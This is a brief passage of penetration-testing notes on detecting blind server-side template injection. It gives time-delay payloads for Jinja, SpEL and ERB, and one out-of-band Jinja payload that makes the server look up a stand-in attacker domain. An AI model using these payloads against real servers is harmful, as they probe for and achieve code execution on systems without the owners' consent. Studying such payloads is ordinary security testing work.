### Blind Probes (preserved from the pre-move corpus group tree)


When output isn't reflected:

- **Time-based**: payload that triggers a sleep on the host language (`{{''.__class__.__mro__[1].__subclasses__()[<idx>](...)}}` for Jinja, `${T(java.lang.Thread).sleep(5000)}` for SpEL, `<%= sleep(5) %>` for ERB)
- **OAST**: payload that performs a DNS lookup or HTTP fetch to attacker infrastructure (`{{request.application.__globals__.__builtins__.__import__('socket').gethostbyname('x.attacker.tld')}}`)
- **Length / ETag diff**: payload whose evaluation changes the body length, even if the value isn't directly visible
